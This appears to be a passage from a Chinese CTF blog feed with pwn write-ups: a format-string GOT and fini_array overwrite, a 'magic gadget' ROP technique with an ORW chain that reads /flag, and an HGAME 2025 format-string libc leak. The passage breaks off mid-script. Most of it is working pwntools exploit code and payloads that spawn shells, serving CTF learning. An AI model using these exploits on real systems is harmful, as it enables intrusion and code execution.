class="headerlink" title="栈上fmt劫持"></a>栈上fmt劫持</h1><font style="color:rgb(48, 49, 51);">fmt直接修改</font><font style="color:rgb(48, 49, 51);">[CISCN 2019西南]</font><font style="color:rgb(48, 49, 51);">给出system函数，但只有一次fmt，64字节，修改printf.got-system.plt,fini_array-main</font><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726716333395-b27c9ea5-5c4d-473e-8786-2edff5f8ded2.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.anna.nssctf.cn&#x27;,25279)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#gdb.attach(p,&#x27;b* 0x080485A8&#x27;)</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">printf=elf.got[&#x27;printf&#x27;]</span><br><span class="line">fini_array=0x0804979C</span><br><span class="line">system=0x080483D0</span><br><span class="line">main=0x08048534</span><br><span class="line">gdb.attach(p, &#x27;b *0x804859E&#x27;)</span><br><span class="line">pause()</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">payload =p32(fini_array+2)+p32(printf+2)+p32(printf)+p32(fini_array)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=&quot;%&quot;+str(0x0804-0x10)+&quot;c%4$hn&quot;   #0804</span><br><span class="line">payload+=&quot;%5$hn&quot;                         #0804</span><br><span class="line">payload+=&quot;%&quot;+str(0x83d0-0x0804)+&quot;c%6$hn&quot; #83d0</span><br><span class="line">payload+=&quot;%&quot;+str(0x8534-0x83d0)+&quot;c%7$hn&quot; #8534</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">sl(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fini_array劫持</summary>
    
    
    
    <category term="fmt" scheme="https://www.thir0th.xyz/categories/fmt/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>魔法的gadget🪄</title>
    <link href="https://www.thir0th.xyz/posts/8541dcda.html"/>
    <id>https://www.thir0th.xyz/posts/8541dcda.html</id>
    <published>2025-04-19T16:17:35.000Z</published>
    <updated>2025-04-19T16:17:33.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>ROPgadget —binary pwn | grep ‘add’                                          </p><p> add dword ptr [rbp - 0x3d], ebx ; nop ; ret</p><p>穷途末路的时候用，将[rbp-0x3d]+rbx赋值给[rbp-0x3d]，配合csu使用。效果甚佳</p><p>适用：只存在栈溢出，无打印函数</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>1.更改stdin为one_gadget或者syscall</p><p>2.call stdin</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>找对应版本的libc,计算与stdin(bss头的libc地址)与one_gadget,syscall的偏移</p><p>0xffffffff对应-1</p><p>stdin偏移查找</p><ol><li>shift+F12后carl+F搜索stdin ,第一个<em>IO_2_1_stdin</em></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682273065-36f28678-c805-4698-84e1-43c9926105de.png" alt=""></p><ol><li>X交叉引用，看data段</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682363461-322438ee-979b-4565-8d16-c8bb31e1885c.png" alt=""></p><p>3.跟进，找到偏移</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682406367-e2a845b6-714e-453b-8dfe-2e42693bdc6f.png" alt=""></p><p>4.计算</p><p>0xffffffff对应-1，红色为stdin,蓝色为one_gadget/syscall,计算偏移</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682829379-e28853e5-a765-4bba-bbfa-b8ef8b97c396.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682963330-4fb9a3c7-794e-42e2-b208-7c2f0ab3dc97.png" alt=""></p><h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><p>1.简单，改stdin为one_gadget，一般选择rsi,rdx等寄存器为空的，因为csu可以控制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(one_gadget)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)+p64(csu_rear)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(stdin)+p64(csu_head)</span><br></pre></td></tr></table></figure><p>中级，没办法控制rax, 可以通过read控制，读入字节数=rax。找控制rax=0的gadget改stdin为syscall ret 调用read后控制rax=0x3b，获取shell。用的libc中的syscall_ret</p><p>ropper —file=/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6 —search “syscall”</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725683449839-79a4d8ed-34de-4805-99fd-add8638ee5a8.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)</span><br><span class="line">s((<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x3b</span>),<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>高级，沙盒，类似的用法，通过read控制rax，控制程序执行orw，读取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722692324147-d6eba25e-5434-4e1c-bd9d-fb9a3283b96f.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">magic=<span class="number">0x000000000040113c</span></span><br><span class="line">csu_head=<span class="number">0x401240</span> </span><br><span class="line">csu_rear=<span class="number">0x40125A</span></span><br><span class="line">stdin=<span class="number">0x404020</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15) </span><br><span class="line">payload+=p64(csu_head)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffef7184)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)+p64(csu_rear)+p64(0)*5+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffe76729)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(0)+p64(stdin+0x400)+p64(0x100)+p64(elf.got[&#x27;read&#x27;])+p64(csu_head)+p64(0)*7</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(stdin+0x400)+p64(0)+p64(0)+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0xffe76729</span>)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">魔法的gadget🪄</summary>
    
    
    
    <category term="magic" scheme="https://www.thir0th.xyz/categories/magic/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2025HGAME</title>
    <link href="https://www.thir0th.xyz/posts/54319d4e.html"/>
    <id>https://www.thir0th.xyz/posts/54319d4e.html</id>
    <published>2025-04-19T16:12:35.000Z</published>
    <updated>2025-04-19T16:35:48.873Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2025hgame"><a href="#2025hgame" class="headerlink" title="2025hgame"></a>2025hgame</h2><p>去年的唯唯诺诺，今年的重拳出击😁</p><h3 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h3><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>无数次格式化字符串漏洞，但是一次只有三个字节，vuln可以直接用-1绕过，关键是利用格式化字符串漏洞泄露出libc地址</p><p>可以用%*d+%s来泄露libc地址，后续直接打system的rop链子</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888731147-3eab4294-7d2c-45a2-bdbc-4cabf401b143.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888590185-0e8c91bc-89e9-42f8-95d7-7460bff37e1c.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31079)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def cmd(a):</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(a)</span><br><span class="line"></span><br><span class="line">rl(&quot;you have n chance to getshell\n n = &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%*d&#x27;)</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%s&#x27;)</span><br><span class="line">libc_base=get_addr64()-2206368</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">rl(&quot; n = &quot;)</span><br><span class="line">#bug()</span><br><span class="line">s(str(-1))</span><br><span class="line">sleep(0.01)</span><br><span 